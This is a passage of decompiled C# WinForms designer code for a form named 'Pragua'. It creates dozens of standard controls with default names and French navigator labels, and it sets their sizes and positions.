		//IL_05a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ab: Expected O, but got Unknown
		//IL_0606: Unknown result type (might be due to invalid IL or missing references)
		//IL_0610: Expected O, but got Unknown
		//IL_0622: Unknown result type (might be due to invalid IL or missing references)
		//IL_062c: Expected O, but got Unknown
		//IL_06d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_092a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0934: Expected O, but got Unknown
		//IL_0b02: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b0c: Expected O, but got Unknown
		//IL_0bf2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bfc: Expected O, but got Unknown
		//IL_0ca5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0caf: Expected O, but got Unknown
		//IL_0ec1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ecb: Expected O, but got Unknown
		//IL_0ffa: Unknown result type (might be due to invalid IL or missing references)
		//IL_1004: Expected O, but got Unknown
		//IL_159a: Unknown result type (might be due to invalid IL or missing references)
		//IL_15a4: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Pragua));
		TabControl1 = new TabControl();
		TabPage1 = new TabPage();
		TableLayoutPanel1 = new TableLayoutPanel();
		TextBox1 = new TextBox();
		TabPage2 = new TabPage();
		BackgroundWorker1 = new BackgroundWorker();
		SplitContainer1 = new SplitContainer();
		StatusStrip1 = new StatusStrip();
		Splitter1 = new Splitter();
		ServiceController1 = new ServiceController();
		RichTextBox1 = new RichTextBox();
		SerialPort1 = new SerialPort(components);
		PrintPreviewDialog1 = new PrintPreviewDialog();
		RadioButton1 = new RadioButton();
		Process1 = new Process();
		SaveFileDialog1 = new SaveFileDialog();
		PropertyGrid1 = new PropertyGrid();
		ProgressBar1 = new ProgressBar();
		Timer1 = new Timer(components);
		BindingNavigatorMoveNextItem = new ToolStripButton();
		ToolStrip1 = new ToolStrip();
		BindingNavigatorSeparator1 = new ToolStripSeparator();
		BindingNavigatorMoveLastItem = new ToolStripButton();
		BindingNavigatorCountItem = new ToolStripLabel();
		BindingNavigatorMovePreviousItem = new ToolStripButton();
		BindingNavigatorPositionItem = new ToolStripTextBox();
		BindingNavigatorSeparator2 = new ToolStripSeparator();
		BindingNavigatorSeparator = new ToolStripSeparator();
		WebBrowser1 = new WebBrowser();
		VScrollBar1 = new VScrollBar();
		TreeView1 = new TreeView();
		BindingNavigatorAddNewItem = new ToolStripButton();
		TrackBar1 = new TrackBar();
		ToolStripContainer1 = new ToolStripContainer();
		ToolTip1 = new ToolTip(components);
		BindingNavigatorDeleteItem = new ToolStripButton();
		PrintPreviewControl1 = new PrintPreviewControl();
		PrintDocument1 = new PrintDocument();
		DomainUpDown1 = new DomainUpDown();
		DirectoryEntry1 = new DirectoryEntry();
		PrintDialog1 = new PrintDialog();
		DirectorySearcher1 = new DirectorySearcher();
		DateTimePicker1 = new DateTimePicker();
		EventLog1 = new EventLog();
		DataGridView1 = new DataGridView();
		FileSystemWatcher1 = new FileSystemWatcher();
		ErrorProvider1 = new ErrorProvider(components);
		FlowLayoutPanel1 = new FlowLayoutPanel();
		CheckedListBox1 = new CheckedListBox();
		ContextMenuStrip1 = new ContextMenuStrip(components);
		BindingSource1 = new BindingSource(components);
		ComboBox1 = new ComboBox();
		CheckBox1 = new CheckBox();
		ColorDialog1 = new ColorDialog();
		Button1 = new Button();
		BindingNavigator1 = new BindingNavigator(components);
		BindingNavigatorMoveFirstItem = new ToolStripButton();
		FolderBrowserDialog1 = new FolderBrowserDialog();
		FontDialog1 = new FontDialog();
		NumericUpDown1 = new NumericUpDown();
		NotifyIcon1 = new NotifyIcon(components);
		MonthCalendar1 = new MonthCalendar();
		OpenFileDialog1 = new OpenFileDialog();
		Panel1 = new Panel();
		PictureBox1 = new PictureBox();
		MaskedTextBox1 = new MaskedTextBox();
		ListView1 = new ListView();
		HelpProvider1 = new HelpProvider();
		ListBox1 = new ListBox();
		HScrollBar1 = new HScrollBar();
		GroupBox1 = new GroupBox();
		ImageList1 = new ImageList(components);
		LinkLabel1 = new LinkLabel();
		Label1 = new Label();
		MenuStrip1 = new MenuStrip();
		((Control)TabControl1).SuspendLayout();
		((Control)TabPage1).SuspendLayout();
		((Control)TableLayoutPanel1).SuspendLayout();
		((Control)SplitContainer1.get_Panel1()).SuspendLayout();
		((Control)SplitContainer1).SuspendLayout();
		((ISupportInitialize)TrackBar1).BeginInit();
		((Control)ToolStripContainer1).SuspendLayout();
		((ISupportInitialize)EventLog1).BeginInit();
		((ISupportInitialize)DataGridView1).BeginInit();
		((ISupportInitialize)FileSystemWatcher1).BeginInit();
		((ISupportInitialize)ErrorProvider1).BeginInit();
		((ISupportInitialize)BindingSource1).BeginInit();
		((ISupportInitialize)BindingNavigator1).BeginInit();
		((Control)BindingNavigator1).SuspendLayout();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((Control)Panel1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage1);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage2);
		TabControl tabControl = TabControl1;
		Point location = new Point(0, 0);
		((Control)tabControl).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedIndex(0);
		TabControl tabControl2 = TabControl1;
		Size size = new Size(200, 100);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl1).set_TabIndex(2);
		((Control)TabPage1).get_Controls().Add((Control)(object)TableLayoutPanel1);
		TabPage tabPage = TabPage1;
		location = new Point(4, 22);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		size = new Size(192, 74);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("TabPage1");
		TabPage1.set_UseVisualStyleBackColor(true);
		TableLayoutPanel1.set_ColumnCount(2);
		TableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 50f));
		TableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 50f));
		TableLayoutPanel1.get_Controls().Add((Control)(object)TextBox1, 0, 0);
		TableLayoutPanel tableLayoutPanel = TableLayoutPanel1;
		location = new Point(0, 0);
		((Control)tableLayoutPanel).set_Location(location);
		((Control)TableLayoutPanel1).set_Name("TableLayoutPanel1");
		TableLayoutPanel1.set_RowCount(2);
		TableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 50f));
		TableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 50f));
		TableLayoutPanel tableLayoutPanel2 = TableLayoutPanel1;
		size = new Size(200, 100);
		((Control)tableLayoutPanel2).set_Size(size);
		((Control)TableLayoutPanel1).set_TabIndex(0);
		TextBox textBox = TextBox1;
		location = new Point(3, 3);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(94, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TabPage tabPage4 = TabPage2;
		location = new Point(4, 22);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(192, 74);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("TabPage2");
		TabPage2.set_UseVisualStyleBackColor(true);
		SplitContainer splitContainer = SplitContainer1;
		location = new Point(0, 6);
		((Control)splitContainer).set_Location(location);
		((Control)SplitContainer1).set_Name("SplitContainer1");
		((Control)SplitContainer1.get_Panel1()).get_Controls().Add((Control)(object)TabControl1);
		((Control)SplitContainer1.get_Panel1()).get_Controls().Add((Control)(object)StatusStrip1);
		((Control)SplitContainer1.get_Panel1()).get_Controls().Add((Control)(object)Splitter1);
		SplitContainer splitContainer2 = SplitContainer1;
		size = new Size(150, 100);
		((Control)splitContainer2).set_Size(size);
		((Control)SplitContainer1).set_TabIndex(58);
		StatusStrip statusStrip = StatusStrip1;
		location = new Point(3, 78);
		((Control)statusStrip).set_Location(location);
		((Control)StatusStrip1).set_Name("StatusStrip1");
		StatusStrip statusStrip2 = StatusStrip1;
		size = new Size(47, 22);
		((Control)statusStrip2).set_Size(size);
		((Control)StatusStrip1).set_TabIndex(1);
		((Control)StatusStrip1).set_Text("StatusStrip1");
		Splitter splitter = Splitter1;
		location = new Point(0, 0);
		((Control)splitter).set_Location(location);
		((Control)Splitter1).set_Name("Splitter1");
		Splitter splitter2 = Splitter1;
		size = new Size(3, 100);
		((Control)splitter2).set_Size(size);
		((Control)Splitter1).set_TabIndex(0);
		Splitter1.set_TabStop(false);
		RichTextBox richTextBox = RichTextBox1;
		location = new Point(24, 30);
		((Control)richTextBox).set_Location(location);
		((Control)RichTextBox1).set_Name("RichTextBox1");
		RichTextBox richTextBox2 = RichTextBox1;
		size = new Size(100, 96);
		((Control)richTextBox2).set_Size(size);
		((Control)RichTextBox1).set_TabIndex(57);
		RichTextBox1.set_Text("");
		PrintPreviewDialog printPreviewDialog = PrintPreviewDialog1;
		size = new Size(0, 0);
		printPreviewDialog.set_AutoScrollMargin(size);
		PrintPreviewDialog printPreviewDialog2 = PrintPreviewDialog1;
		size = new Size(0, 0);
		printPreviewDialog2.set_AutoScrollMinSize(size);
		PrintPreviewDialog printPreviewDialog3 = PrintPreviewDialog1;
		size = new Size(400, 300);
		((Form)printPreviewDialog3).set_ClientSize(size);
		PrintPreviewDialog1.set_Enabled(true);
		PrintPreviewDialog1.set_Icon((Icon)componentResourceManager.GetObject("PrintPreviewDialog1.Icon"));
		((Control)PrintPreviewDialog1).set_Name("PrintPreviewDialog1");
		PrintPreviewDialog1.set_Visible(false);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(16, 22);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(56);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		Process1.StartInfo.Domain = "";
		Process1.StartInfo.LoadUserProfile = false;
		Process1.StartInfo.Password = null;
		Process1.StartInfo.StandardErrorEncoding = null;
		Process1.StartInfo.StandardOutputEncoding = null;
		Process1.StartInfo.UserName = "";
		Process1.SynchronizingObject = (ISynchronizeInvoke?)this;
		PropertyGrid propertyGrid = PropertyGrid1;
		location = new Point(8, 14);
		((Control)propertyGrid).set_Location(location);
		((Control)PropertyGrid1).set_Name("PropertyGrid1");
		PropertyGrid propertyGrid2 = PropertyGrid1;
		size = new Size(130, 130);
		((Control)propertyGrid2).set_Size(size);
		((Control)PropertyGrid1).set_TabIndex(55);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(0, 6);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(100, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(54);
		((ToolStripItem)BindingNavigatorMoveNextItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorMoveNextItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveNextItem.Image"));
		((ToolStripItem)BindingNavigatorMoveNextItem).set_Name("BindingNavigatorMoveNextItem");
		((ToolStripItem)BindingNavigatorMoveNextItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorMoveNextItem = BindingNavigatorMoveNextItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorMoveNextItem).set_Size(size);
		((ToolStripItem)BindingNavigatorMoveNextItem).set_Text("Déplacer vers le bas");
		ToolStrip toolStrip = ToolStrip1;
		location = new Point(0, 49);
		((Control)toolStrip).set_Location(location);
		((Control)ToolStrip1).set_Name("ToolStrip1");
		ToolStrip toolStrip2 = ToolStrip1;
		size = new Size(284, 25);
		((Control)toolStrip2).set_Size(size);
		((Control)ToolStrip1).set_TabIndex(59);
		((Control)ToolStrip1).set_Text("ToolStrip1");
		((ToolStripItem)BindingNavigatorSeparator1).set_Name("BindingNavigatorSeparator1");
		ToolStripSeparator bindingNavigatorSeparator = BindingNavigatorSeparator1;
		size = new Size(6, 25);
		((ToolStripItem)bindingNavigatorSeparator).set_Size(size);
		((ToolStripItem)BindingNavigatorMoveLastItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorMoveLastItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveLastItem.Image"));
		((ToolStripItem)BindingNavigatorMoveLastItem).set_Name("BindingNavigatorMoveLastItem");
		((ToolStripItem)BindingNavigatorMoveLastItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorMoveLastItem = BindingNavigatorMoveLastItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorMoveLastItem).set_Size(size);
		((ToolStripItem)BindingNavigatorMoveLastItem).set_Text("Placer en dernier");
		((ToolStripItem)BindingNavigatorCountItem).set_Name("BindingNavigatorCountItem");
		ToolStripLabel bindingNavigatorCountItem = BindingNavigatorCountItem;
		size = new Size(37, 22);
		((ToolStripItem)bindingNavigatorCountItem).set_Size(size);
		((ToolStripItem)BindingNavigatorCountItem).set_Text("de {0}");
		((ToolStripItem)BindingNavigatorCountItem).set_ToolTipText("Nombre total d'éléments");
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMovePreviousItem.Image"));
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_Name("BindingNavigatorMovePreviousItem");
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorMovePreviousItem = BindingNavigatorMovePreviousItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorMovePreviousItem).set_Size(size);
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_Text("Déplacer vers le haut");
		((ToolStripItem)BindingNavigatorPositionItem).set_AccessibleName("Position");
		((ToolStripItem)BindingNavigatorPositionItem).set_AutoSize(false);
		((ToolStripItem)BindingNavigatorPositionItem).set_Name("BindingNavigatorPositionItem");
		ToolStripTextBox bindingNavigatorPositionItem = BindingNavigatorPositionItem;
		size = new Size(50, 23);
		((ToolStripControlHost)bindingNavigatorPositionItem).set_Size(size);
		((ToolStripControlHost)BindingNavigatorPositionItem).set_Text("0");
		((ToolStripItem)BindingNavigatorPositionItem).set_ToolTipText("Position actuelle");
		((ToolStripItem)BindingNavigatorSeparator2).set_Name("BindingNavigatorSeparator2");
		ToolStripSeparator bindingNavigatorSeparator2 = BindingNavigatorSeparator2;
		size = new Size(6, 25);
		((ToolStripItem)bindingNavigatorSeparator2).set_Size(size);
		((ToolStripItem)BindingNavigatorSeparator).set_Name("BindingNavigatorSeparator");
		ToolStripSeparator bindingNavigatorSeparator3 = BindingNavigatorSeparator;
		size = new Size(6, 25);
		((ToolStripItem)bindingNavigatorSeparator3).set_Size(size);
		WebBrowser webBrowser = WebBrowser1;
		location = new Point(0, 6);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		size = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(size);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser webBrowser3 = WebBrowser1;
		size = new Size(250, 250);
		((Control)webBrowser3).set_Size(size);
		((Control)WebBrowser1).set_TabIndex(64);
		VScrollBar vScrollBar = VScrollBar1;
		location = new Point(16, 22);
		((Control)vScrollBar).set_Location(location);
		((Control)VScrollBar1).set_Name("VScrollBar1");
		VScrollBar vScrollBar2 = VScrollBar1;
		size = new Size(17, 80);
		((Control)vScrollBar2).set_Size(size);
		((Control)VScrollBar1).set_TabIndex(63);
		TreeView treeView = TreeView1;
		location = new Point(8, 14);
		((Control)treeView).set_Location(location);
		((Control)TreeView1).set_Name("TreeView1");
		TreeView treeView2 = TreeView1;
		size = new Size(121, 97);
		((Control)treeView2).set_Size(size);
		((Control)TreeView1).set_TabIndex(62);
		((ToolStripItem)BindingNavigatorAddNewItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorAddNewItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorAddNewItem.Image"));
		((ToolStripItem)BindingNavigatorAddNewItem).set_Name("BindingNavigatorAddNewItem");
		((ToolStripItem)BindingNavigatorAddNewItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorAddNewItem = BindingNavigatorAddNewItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorAddNewItem).set_Size(size);
		((ToolStripItem)BindingNavigatorAddNewItem).set_Text("Ajouter nouveau");
		TrackBar trackBar = TrackBar1;
		location = new Point(0, 6);
		((Control)trackBar).set_Location(location);
		((Control)TrackBar1).set_Name("TrackBar1");
		TrackBar trackBar2 = TrackBar1;
		size = new Size(104, 45);
		((Control)trackBar2).set_Size(size);
		((Control)TrackBar1).set_TabIndex(61);
		ToolStripContentPanel contentPanel = ToolStripContainer1.get_ContentPanel();
		size = new Size(150, 150);
		((Control)contentPanel).set_Size(size);
		ToolStripContainer toolStripContainer = ToolStripContainer1;
		location = new Point(8, 63);
		((Control)toolStripContainer).set_Location(location);
		((Control)ToolStripContainer1).set_Name("ToolStripContainer1");
		ToolStripContainer toolStripContainer2 = ToolStripContainer1;
		size = new Size(150, 175);
		((Control)toolStripContainer2).set_Size(size);
		((Control)ToolStripContainer1).set_TabIndex(60);
		((Control)ToolStripContainer1).set_Text("ToolStripContainer1");
		((ToolStripItem)BindingNavigatorDeleteItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorDeleteItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorDeleteItem.Image"));
		((ToolStripItem)BindingNavigatorDeleteItem).set_Name("BindingNavigatorDeleteItem");
		((ToolStripItem)BindingNavigatorDeleteItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorDeleteItem = BindingNavigatorDeleteItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorDeleteItem).set_Size(size);
		((ToolStripItem)BindingNavigatorDeleteItem).set_Text("Supprimer");
		PrintPreviewControl printPreviewControl = PrintPreviewControl1;
		location = new Point(0, 6);
		((Control)printPreviewControl).set_Location(location);
		((Control)PrintPreviewControl1).set_Name("PrintPreviewControl1");
		PrintPreviewControl printPreviewControl2 = PrintPreviewControl1;
		size = new Size(100, 100);
		((Control)printPreviewControl2).set_Size(size);
		((Control)PrintPreviewControl1).set_TabIndex(53);
		DomainUpDown domainUpDown = DomainUpDown1;
		location = new Point(0, 6);
		((Control)domainUpDown).set_Location(location);
		((Control)DomainUpDown1).set_Name("DomainUpDown1");
		DomainUpDown domainUpDown2 = DomainUpDown1;
		size = new Size(120, 20);
		((Control)domainUpDown2).set_Size(size);
		((Control)DomainUpDown1).set_TabIndex(40);
		((UpDownBase)DomainUpDown1).set_Text("DomainUpDown1");
		PrintDialog1.set_UseEXDialog(true);
		DirectorySearcher1.set_ClientTimeout(TimeSpan.Parse("-00:00:01"));
		DirectorySearcher1.set_ServerPageTimeLimit(TimeSpan.Parse("-00:00:01"));
		DirectorySearcher1.set_ServerTimeLimit(TimeSpan.Parse("-00:00:01"));
		DateTimePicker dateTimePicker = DateTimePicker1;
		location = new Point(8, 14);
		((Control)dateTimePicker).set_Location(location);
		((Control)DateTimePicker1).set_Name("DateTimePicker1");
		DateTimePicker dateTimePicker2 = DateTimePicker1;
		size = new Size(200, 20);
		((Control)dateTimePicker2).set_Size(size);
		((Control)DateTimePicker1).set_TabIndex(39);
		EventLog1.set_SynchronizingObject((ISynchronizeInvoke)this);
		DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		DataGridView dataGridView = DataGridView1;
		location = new Point(0, 6);
		((Control)dataGridView).set_Location(location);
		((Control)DataGridView1).set_Name("DataGridView1");
		DataGridView dataGridView2 = DataGridView1;
		size = new Size(240, 150);
		((Control)dataGridView2).set_Size(size);
		((Control)DataGridView1).set_TabIndex(38);
		FileSystemWatcher1.EnableRaisingEvents = true;
		FileSystemWatcher1.SynchronizingObject = (ISynchronizeInvoke?)this;
		ErrorProvider1.set_ContainerControl((ContainerControl)(object)this);
		FlowLayoutPanel flowLayoutPanel = FlowLayoutPanel1;
		location = new Point(0, 6);
		((Control)flowLayoutPanel).set_Location(location);
		((Control)FlowLayoutPanel1).set_Name("FlowLayoutPanel1");
		FlowLayoutPanel flowLayoutPanel2 = FlowLayoutPanel1;
		size = new Size(200, 100);
		((Control)flowLayoutPanel2).set_Size(size);
		((Control)FlowLayoutPanel1).set_TabIndex(41);
		((ListControl)CheckedListBox1).set_FormattingEnabled(true);
		CheckedListBox checkedListBox = CheckedListBox1;
		location = new Point(16, 22);
		((Control)checkedListBox).set_Location(location);
		((Control)CheckedListBox1).set_Name("CheckedListBox1");
		CheckedListBox checkedListBox2 = CheckedListBox1;
		size = new Size(120, 94);
		((Control)checkedListBox2).set_Size(size);
		((Control)CheckedListBox1).set_TabIndex(36);
		((Control)ContextMenuStrip1).set_Name("ContextMenuStrip1");
		ContextMenuStrip contextMenuStrip = ContextMenuStrip1;
		size = new Size(61, 4);
		((Control)contextMenuStrip).set_Size(size);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox comboBox = ComboBox1;
		location = new Point(0, 6);
		((Control)comboBox).set_Location(location);
		((Control)ComboBox1).set_Name("ComboBox1");
		ComboBox comboBox2 = ComboBox1;
		size = new Size(121, 21);
		((Control)comboBox2).set_Size(size);
		((Control)ComboBox1).set_TabIndex(37);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(8, 14);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(35);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Button button = Button1;
		location = new Point(0, 6);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(34);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		BindingNavigator1.set_AddNewItem((ToolStripItem)(object)BindingNavigatorAddNewItem);
		BindingNavigator1.set_CountItem((ToolStripItem)(object)BindingNavigatorCountItem);
		BindingNavigator1.set_DeleteItem((ToolStripItem)(object)BindingNavigatorDeleteItem);
		((ToolStrip)BindingNavigator1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[11]
		{
			(ToolStripItem)BindingNavigatorMoveFirstItem,
			(ToolStripItem)BindingNavigatorMovePreviousItem,
			(ToolStripItem)BindingNavigatorSeparator,
			(ToolStripItem)BindingNavigatorPositionItem,
			(ToolStripItem)BindingNavigatorCountItem,
			(ToolStripItem)BindingNavigatorSeparator1,
			(ToolStripItem)BindingNavigatorMoveNextItem,
			(ToolStripItem)BindingNavigatorMoveLastItem,
			(ToolStripItem)BindingNavigatorSeparator2,
			(ToolStripItem)BindingNavigatorAddNewItem,
			(ToolStripItem)BindingNavigatorDeleteItem
		});
		BindingNavigator bindingNavigator = BindingNavigator1;
		location = new Point(0, 24);
		((Control)bindingNavigator).set_Location(location);
		BindingNavigator1.set_MoveFirstItem((ToolStripItem)(object)BindingNavigatorMoveFirstItem);
		BindingNavigator1.set_MoveLastItem((ToolStripItem)(object)BindingNavigatorMoveLastItem);
		BindingNavigator1.set_MoveNextItem((ToolStripItem)(object)BindingNavigatorMoveNextItem);
		BindingNavigator1.set_MovePreviousItem((ToolStripItem)(object)BindingNavigatorMovePreviousItem);
		((Control)BindingNavigator1).set_Name("BindingNavigator1");
		BindingNavigator1.set_PositionItem((ToolStripItem)(object)BindingNavigatorPositionItem);
		BindingNavigator bindingNavigator2 = BindingNavigator1;
		size = new Size(284, 25);
		((Control)bindingNavigator2).set_Size(size);
		((Control)BindingNavigator1).set_TabIndex(33);
		((Control)BindingNavigator1).set_Text("BindingNavigator1");
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveFirstItem.Image"));
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_Name("BindingNavigatorMoveFirstItem");
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorMoveFirstItem = BindingNavigatorMoveFirstItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorMoveFirstItem).set_Size(size);
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_Text("Placer en premier");
		NumericUpDown numericUpDown = NumericUpDown1;
		location = new Point(0, 6);
		((Control)numericUpDown).set_Location(location);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		NumericUpDown numericUpDown2 = NumericUpDown1;
		size = new Size(120, 20);
		((Control)numericUpDown2).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(51);
		NotifyIcon1.set_Text("NotifyIcon1");
		NotifyIcon1.set_Visible(true);
		MonthCalendar monthCalendar = MonthCalendar1;
		location = new Point(8, 14);
		((Control)monthCalendar).set_Location(location);
		((Control)MonthCalendar1).set_Name("MonthCalendar1");
		((Control)MonthCalendar1).set_TabIndex(50);
		((FileDialog)OpenFileDialog1).set_FileName("OpenFileDialog1");
		((Control)Panel1).get_Controls().Add((Control)(object)PictureBox1);
		Panel panel = Panel1;
		location = new Point(0, 6);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(200, 100);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(52);
		PictureBox pictureBox = PictureBox1;
		location = new Point(0, 0);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(100, 50);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		MaskedTextBox maskedTextBox = MaskedTextBox1;
		location = new Point(32, 38);
		((Control)maskedTextBox).set_Location(location);
		((Control)MaskedTextBox1).set_Name("MaskedTextBox1");
		MaskedTextBox maskedTextBox2 = MaskedTextBox1;
		size = new Size(100, 20);
		((Control)maskedTextBox2).set_Size(size);
		((Control)MaskedTextBox1).set_TabIndex(48);
		ListView listView = ListView1;
		location = new Point(24, 30);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		ListView listView2 = ListView1;
		size = new Size(121, 97);
		((Control)listView2).set_Size(size);
		((Control)ListView1).set_TabIndex(47);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		location = new Point(16, 22);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(46);
		HScrollBar hScrollBar = HScrollBar1;
		location = new Point(0, 6);
		((Control)hScrollBar).set_Location(location);
		((Control)HScrollBar1).set_Name("HScrollBar1");
		HScrollBar hScrollBar2 = HScrollBar1;
		size = new Size(80, 17);
		((Control)hScrollBar2).set_Size(size);
		((Control)HScrollBar1).set_TabIndex(43);
		GroupBox groupBox = GroupBox1;
		location = new Point(0, 6);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(200, 100);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(42);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("GroupBox1");
		ImageList1.set_ColorDepth((ColorDepth)8);
		ImageList imageList = ImageList1;
		size = new Size(16, 16);
		imageList.set_ImageSize(size);
		ImageList1.set_TransparentColor(Color.Transparent);
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(8, 14);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(45);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(0, 6);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
